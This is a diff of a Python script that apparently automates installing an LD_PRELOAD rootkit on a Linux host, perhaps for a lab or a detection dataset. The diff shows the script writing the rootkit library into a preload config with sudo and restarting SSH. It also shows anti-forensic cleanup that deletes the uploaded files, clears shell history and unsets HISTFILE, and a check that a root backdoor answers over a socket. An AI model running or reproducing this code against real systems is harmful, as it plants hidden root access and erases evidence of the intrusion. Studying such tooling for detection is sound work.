@@ -48,11 +48,9 @@ PREPARE_AND_BUILD_COMMANDS = (
 CLEANUP_COMMANDS = (
     f"rm -f -- {UPLOAD_PATH}",
     'rm -rf -- "$source"',
-    f'test ! -e {UPLOAD_PATH} && test ! -e "$source" && test -e {PRELOAD_CONFIG} && test -e {INSTALLED_LIBRARY}',
     "history -c",
     'rm -f -- "${HISTFILE:-$HOME/.bash_history}"',
     "unset HISTFILE",
-    'test ! -e "$HOME/.bash_history"',
 )
 
 
@@ -96,7 +94,8 @@ def run_father(
                 raise RuntimeError("Controlled file was not visible before activation")
 
             for command in (
-                f"printf '%s\\n' {INSTALLED_LIBRARY} " f"| sudo -n tee {PRELOAD_CONFIG}",
+                f"printf '%s\\n' {INSTALLED_LIBRARY} "
+                f"| sudo -n tee {PRELOAD_CONFIG}",
                 "sudo -n systemctl restart ssh.service",
             ):
                 run_logged_command(terminal, command_log_path, command, timeout=180)
@@ -210,9 +209,7 @@ def _validate_backdoor(
             client.sendall(b"id\n")
             identity = next(
                 (
-                    line.decode(errors="replace")
-                    .strip()
-                    .removeprefix("\x1b[0m")
+                    line.decode(errors="replace").strip().removeprefix("\x1b[0m")
                     for line in response
                     if b"uid=0(root)" in line and b"gid=1337" in line
                 ),
